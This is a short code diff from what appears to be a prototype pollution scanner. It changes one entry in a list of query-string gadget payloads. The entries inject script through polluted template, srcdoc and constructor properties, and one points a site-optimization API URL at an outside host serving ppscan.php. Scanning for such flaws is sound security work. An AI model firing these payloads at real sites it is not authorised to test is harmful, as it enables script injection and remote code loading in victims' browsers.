@@ -38,7 +38,7 @@ var GADGETS = [
     `__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('debugger')(),"`,
     '__proto__[template]=<script>debugger</script>',
     '__proto__[srcdoc]=<script>debugger</script>',
-    '__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//p6.is/ppscan.php',
+    '__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//zdojkzdzdzodkzodkzodkzodkze.com/ppscan.php',
 ];
 
 window.addEventListener('message', function(event) {
